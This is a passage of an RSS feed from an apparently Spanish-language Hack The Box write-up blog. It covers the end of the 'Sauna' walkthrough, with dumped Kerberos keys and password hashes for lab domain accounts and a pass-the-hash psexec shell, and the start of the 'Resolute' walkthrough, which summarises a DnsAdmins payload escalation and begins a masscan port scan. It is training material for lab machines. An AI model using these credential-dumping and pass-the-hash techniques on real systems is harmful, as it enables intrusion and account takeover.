&lt;span class=&#34;n&#34;&gt;EGOTISTICAL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BANK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOCAL&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;FSmith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aes256&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hmac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;96&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;EGOTISTICAL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BANK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOCAL&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;FSmith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aes128&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hmac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;96&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c6b07440ed43f8d15e671846d5b843b&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;EGOTISTICAL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BANK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOCAL&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;FSmith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;des&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cbc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b50e02ab0d85f76b&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;EGOTISTICAL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BANK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOCAL&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;svc_loanmgr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aes256&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hmac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;96&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;EGOTISTICAL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BANK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOCAL&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;svc_loanmgr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aes128&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hmac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;96&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ea32a31a1e22cb272870d79ca6d972c&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;EGOTISTICAL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BANK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOCAL&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;svc_loanmgr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;des&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cbc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a896d16c28cf4a2&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;SAUNA&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aes256&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hmac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;96&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;69&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c8e51b35b01f1a8ab165234d674ab739770549b8741e176f51a75780a8bfe2&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;SAUNA&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aes128&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hmac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;96&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d7e85b92a9930e14eb79b15519775a1&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;SAUNA&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;des&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cbc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fea201988a20bf46&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Cleaning&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;up&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sauna/Screenshot_20200226_193436.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;psexecpy&#34;&gt;Psexec.py&lt;/h2&gt;
&lt;p&gt;Logramos obtener los hashes del usuario Administrator, utilizamos psexec.py con los hashes que encontramos para obtener una shell y nuestra flag root.txt.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sauna/Screenshot_20200226_193505.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/sauna/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/sauna/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>smbclient</category>
            
          
            
              <category>evil-winrm</category>
            
          
            
              <category>bloodhound</category>
            
          
            
              <category>aclpwn</category>
            
          
            
              <category>impacket</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Resolute</title>
        <link>https://sckull.github.io/posts/resolute/</link>
        <pubDate>Thu, 28 May 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 28 May 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/resolute/</guid>
        <description>Resolute con SO Windows expone Samba y Ldap, lo que nos dio informacion para ingresar por WinRM.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/resolute/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Resolute con SO Windows expone Samba y Ldap, lo que nos dio informacion para ingresar por WinRM. Encontramos credenciales en un archivo para tener acceso a un segundo usuario. Encontramos que el usuario petenece al grupo DnsAdmins, configuramos dnscmd con un payload de metasploit para conseguir una shell como administrador.&lt;/p&gt;
&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/220&#34;&gt;Resolute&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.169&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1190&#34;&gt;egre55&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/1190&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[7.8, 7.7, 5.9, 4.1, 2.3],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[6, 7, 3, 7, 3],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puertos tcp/udp y servicios con masscan y nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;masscan -p1-65535,U:1-65535 10.10.10.169 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0
